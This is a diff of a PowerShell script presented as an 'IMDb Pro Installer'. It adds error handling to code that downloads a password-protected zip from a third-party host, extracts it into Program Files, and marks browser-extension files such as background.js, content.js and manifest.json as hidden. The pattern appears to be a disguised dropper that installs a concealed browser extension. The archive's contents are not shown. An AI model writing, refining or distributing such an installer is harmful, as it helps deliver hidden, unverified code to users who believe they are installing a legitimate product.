@@ -1,4 +1,4 @@
-# IMDb Pro Installer - Fixed Temporary File Name
+# IMDb Pro Installer - Enhanced Version with Better Error Handling
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
@@ -307,7 +307,7 @@ function Update-Status {
     Start-Sleep -Milliseconds 400
 }
 
-# FIXED: Download function with correct file name
+# FIXED: Download function with better error handling
 function Download-FileWithProgress {
     param(
         [string]$Url,
@@ -318,18 +318,39 @@ function Download-FileWithProgress {
         Write-Host "📥 Downloading from: $Url" -ForegroundColor Cyan
         Write-Host "📁 Saving to: $OutputPath" -ForegroundColor Cyan
         
+        # Create a web client with proper timeout settings
         $webClient = New-Object System.Net.WebClient
+        $webClient.Timeout = 30000 # 30 seconds timeout
+        
+        # Add user agent to avoid potential blocking
+        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        
+        # Download the file
         $webClient.DownloadFile($Url, $OutputPath)
         
         # Verify download
         if (Test-Path $OutputPath) {
             $fileInfo = Get-Item $OutputPath
-            Write-Host "✅ Download successful! Size: $($fileInfo.Length) bytes" -ForegroundColor Green
-            return $true
+            if ($fileInfo.Length -gt 0) {
+                Write-Host "✅ Download successful! Size: $($fileInfo.Length) bytes" -ForegroundColor Green
+                return $true
+            } else {
+                Write-Host "❌ Download failed - file is empty" -ForegroundColor Red
+                return $false
+            }
         } else {
             Write-Host "❌ Download failed - file not created" -ForegroundColor Red
             return $false
         }
+    }
+    catch [System.Net.WebException] {
+        Write-Host "❌ Network error: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "Status: $($_.Exception.Status)" -ForegroundColor Red
+        if ($_.Exception.Response) {
+            $statusCode = $_.Exception.Response.StatusCode
+            Write-Host "HTTP Status: $statusCode" -ForegroundColor Red
+        }
+        return $false
     }
     catch {
         Write-Host "❌ Download error: $($_.Exception.Message)" -ForegroundColor Red
@@ -337,7 +358,7 @@ function Download-FileWithProgress {
     }
 }
 
-# FIXED: Enhanced extraction functions
+# FIXED: Enhanced extraction functions with better error handling
 function Test-7ZipAvailable {
     $locations = @(
         "7z",
@@ -347,13 +368,18 @@ function Test-7ZipAvailable {
     )
     
     foreach ($location in $locations) {
-        if (Get-Command $location -ErrorAction SilentlyContinue) {
-            Write-Host "✅ 7-Zip found: $location" -ForegroundColor Green
-            return $location
+        try {
+            if (Get-Command $location -ErrorAction SilentlyContinue) {
+                Write-Host "✅ 7-Zip found: $location" -ForegroundColor Green
+                return $location
+            }
+            if (Test-Path $location) {
+                Write-Host "✅ 7-Zip found: $location" -ForegroundColor Green
+                return $location
+            }
         }
-        if (Test-Path $location) {
-            Write-Host "✅ 7-Zip found: $location" -ForegroundColor Green
-            return $location
+        catch {
+            Write-Host "⚠️ Error checking 7-Zip at $location : $($_.Exception.Message)" -ForegroundColor Yellow
         }
     }
     Write-Host "❌ 7-Zip not found" -ForegroundColor Red
@@ -371,30 +397,63 @@ function Extract-With7Zip {
     Update-Status "Using 7-Zip for extraction..." 0 "📦"
     
     try {
+        # Ensure the destination exists
+        if (-not (Test-Path $Destination)) {
+            New-Item -ItemType Directory -Path $Destination -Force | Out-Null
+        }
+        
         # Build 7-Zip arguments
         $arguments = @(
             "x",           # Extract
             "-p$Password", # Password
             "-o$Destination", # Output directory
             "-y",          # Yes to all
+            "-bb1",        # Show progress
             $ZipFile       # Archive file
         )
         
         Write-Host "🔧 Executing: $7zipPath $($arguments -join ' ')" -ForegroundColor Cyan
         
-        $process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
+        # Use Start-Process with proper error handling
+        $process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$env:TEMP\7zip-output.txt" -RedirectStandardError "$env:TEMP\7zip-error.txt"
+        
+        # Check for errors
+        if (Test-Path "$env:TEMP\7zip-error.txt") {
+            $errorContent = Get-Content "$env:TEMP\7zip-error.txt" -Raw
+            if ($errorContent -and $errorContent.Trim() -ne "") {
+                Write-Host "⚠️ 7-Zip stderr: $errorContent" -ForegroundColor Yellow
+            }
+        }
         
         if ($process.ExitCode -eq 0) {
             Write-Host "✅ 7-Zip extraction successful!" -ForegroundColor Green
             return $true
         } else {
             Write-Host "❌ 7-Zip extraction failed with exit code: $($process.ExitCode)" -ForegroundColor Red
+            
+            # Show output if available
+            if (Test-Path "$env:TEMP\7zip-output.txt") {
+                $outputContent = Get-Content "$env:TEMP\7zip-output.txt" -Raw
+                if ($outputContent -and $outputContent.Trim() -ne "") {
+                    Write-Host "7-Zip output: $outputContent" -ForegroundColor Yellow
+                }
+            }
+            
             return $false
         }
     }
     catch {
         Write-Host "❌ 7-Zip extraction error: $($_.Exception.Message)" -ForegroundColor Red
         return $false
+    }
+    finally {
+        # Clean up temp files
+        if (Test-Path "$env:TEMP\7zip-output.txt") {
+            Remove-Item "$env:TEMP\7zip-output.txt" -Force -ErrorAction SilentlyContinue
+        }
+        if (Test-Path "$env:TEMP\7zip-error.txt") {
+            Remove-Item "$env:TEMP\7zip-error.txt" -Force -ErrorAction SilentlyContinue
+        }
     }
 }
 
@@ -404,6 +463,11 @@ function Extract-WithDotNet {
     Update-Status "Using .NET extraction method..." 0 "⚡"
     
     try {
+        # Ensure the destination exists
+        if (-not (Test-Path $Destination)) {
+            New-Item -ItemType Directory -Path $Destination -Force | Out-Null
+        }
+        
         # Extract using .NET (may not work with password)
         [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $Destination)
         Write-Host "✅ .NET extraction successful!" -ForegroundColor Green
@@ -421,9 +485,14 @@ function Extract-WithShellApplication {
     Update-Status "Using Windows Shell extraction..." 0 "🖥️"
     
     try {
+        # Ensure the destination exists
+        if (-not (Test-Path $Destination)) {
+            New-Item -ItemType Directory -Path $Destination -Force | Out-Null
+        }
+        
         $shell = New-Object -ComObject Shell.Application
-        $zipFolder = $shell.NameSpace($ZipFile)
-        $destFolder = $shell.NameSpace($Destination)
+        $zipFolder = $shell.NameSpace((Resolve-Path $ZipFile).Path)
+        $destFolder = $shell.NameSpace((Resolve-Path $Destination).Path)
         
         if ($zipFolder -eq $null) {
             Write-Host "❌ Shell: Cannot open ZIP file" -ForegroundColor Red
@@ -434,7 +503,7 @@ function Extract-WithShellApplication {
         $destFolder.CopyHere($zipFolder.Items(), 0x14) # 0x14 = No progress UI + Yes to all
         
         # Wait for extraction to complete
-        Start-Sleep -Seconds 3
+        Start-Sleep -Seconds 5
         
         # Verify extraction
         $extractedFiles = Get-ChildItem $Destination -Recurse | Where-Object { !$_.PSIsContainer }
@@ -450,6 +519,12 @@ function Extract-WithShellApplication {
     catch {
         Write-Host "❌ Shell extraction error: $($_.Exception.Message)" -ForegroundColor Red
         return $false
+    }
+    finally {
+        # Release COM objects
+        if ($shell -ne $null) {
+            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null
+        }
     }
 }
 
@@ -483,8 +558,8 @@ function Extract-ZipWithPassword {
     
     # Try multiple extraction methods
     $extractionMethods = @(
-        @{ Name = "7-Zip"; Function = ${function:Extract-With7Zip} },
         @{ Name = "Windows Shell"; Function = ${function:Extract-WithShellApplication} },
+        @{ Name = "7-Zip"; Function = ${function:Extract-With7Zip} },
         @{ Name = ".NET Framework"; Function = ${function:Extract-WithDotNet} }
     )
     
@@ -500,6 +575,13 @@ function Extract-ZipWithPassword {
             $extractedFiles = Get-ChildItem $Destination -Recurse | Where-Object { !$_.PSIsContainer }
             if ($extractedFiles.Count -gt 0) {
                 Write-Host "📁 Verified: $($extractedFiles.Count) files extracted" -ForegroundColor Green
+                
+                # List extracted files for debugging
+                Write-Host "📋 Extracted files:" -ForegroundColor Cyan
+                foreach ($file in $extractedFiles) {
+                    Write-Host "   - $($file.Name)" -ForegroundColor Gray
+                }
+                
                 return $true
             } else {
                 Write-Host "⚠️ Extraction reported success but no files found" -ForegroundColor Yellow
@@ -514,13 +596,25 @@ function Extract-ZipWithPassword {
     return $false
 }
 
-# Function to hide specific files
+# Function to hide specific files with better error handling
 function Hide-Files {
     param([string]$FolderPath)
     
     $filesToHide = @("background.js", "content.js", "popup.js", "styles.css", "popup.html", "manifest.json")
     
     Write-Host "`n🔒 Hiding sensitive files..." -ForegroundColor Cyan
+    
+    # First, let's check what files actually exist in the folder
+    $existingFiles = Get-ChildItem $FolderPath -File | Select-Object -ExpandProperty Name
+    Write-Host "📋 Found $($existingFiles.Count) files in $FolderPath" -ForegroundColor Cyan
+    
+    foreach ($file in $existingFiles) {
+        Write-Host "   - $file" -ForegroundColor Gray
+    }
+    
+    $hiddenCount = 0
+    $notFoundCount = 0
+    $errorCount = 0
     
     foreach ($file in $filesToHide) {
         $filePath = Join-Path $FolderPath $file
@@ -529,21 +623,54 @@ function Hide-Files {
                 # Set file attributes to Hidden
                 Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
                 Write-Host "✅ Hidden: $file" -ForegroundColor Green
+                $hiddenCount++
             }
             catch {
                 Write-Host "⚠️ Failed to hide $file : $($_.Exception.Message)" -ForegroundColor Yellow
+                $errorCount++
             }
         } else {
             Write-Host "❌ File not found: $file" -ForegroundColor Red
+            $notFoundCount++
+        }
+    }
+    
+    Write-Host "📊 Summary: $hiddenCount files hidden, $notFoundCount files not found, $errorCount errors" -ForegroundColor Cyan
+    
+    # If we couldn't find any of the expected files, list what's in subdirectories
+    if ($notFoundCount -ge $filesToHide.Count) {
+        Write-Host "🔍 Checking subdirectories for files..." -ForegroundColor Cyan
+        
+        $subDirs = Get-ChildItem $FolderPath -Directory
+        foreach ($dir in $subDirs) {
+            Write-Host "📁 Checking subdirectory: $($dir.Name)" -ForegroundColor Gray
+            $subFiles = Get-ChildItem $dir.FullName -File | Select-Object -ExpandProperty Name
+            
+            foreach ($file in $subFiles) {
+                Write-Host "   - $file" -ForegroundColor DarkGray
+                
+                # If this is one of our target files, try to hide it
+                if ($filesToHide -contains $file) {
+                    $filePath = Join-Path $dir.FullName $file
+                    try {
+                        Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+                        Write-Host "✅ Hidden: $file (in subdirectory)" -ForegroundColor Green
+                        $hiddenCount++
+                    }
+                    catch {
+                        Write-Host "⚠️ Failed to hide $file : $($_.Exception.Message)" -ForegroundColor Yellow
+                        $errorCount++
+                    }
+                }
+            }
         }
     }
 }
 
-# FIXED: Enhanced Installation function with correct file names
+# FIXED: Enhanced Installation function with better error handling
 function Start-Installation {
     $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
-    # FIXED: Correct temporary file name
-    $tempFile = "$env:TEMP\imdb.zip"
+    $tempFile = "$env:TEMP\imdb_pro_$([Guid]::NewGuid().ToString()).zip"
     $installPath = "C:\Program Files\imdb-pro"
     $zipPassword = "123"
     
@@ -581,7 +708,7 @@ function Start-Installation {
         # Phase 3: Download file
         Update-Status "Downloading IMDb Pro package..." 40 "📥" -Loading
         
-        # Actual download with correct file name
+        # Actual download with unique file name
         $downloadSuccess = Download-FileWithProgress -Url $downloadUrl -OutputPath $tempFile
         
         if (-not $downloadSuccess) {
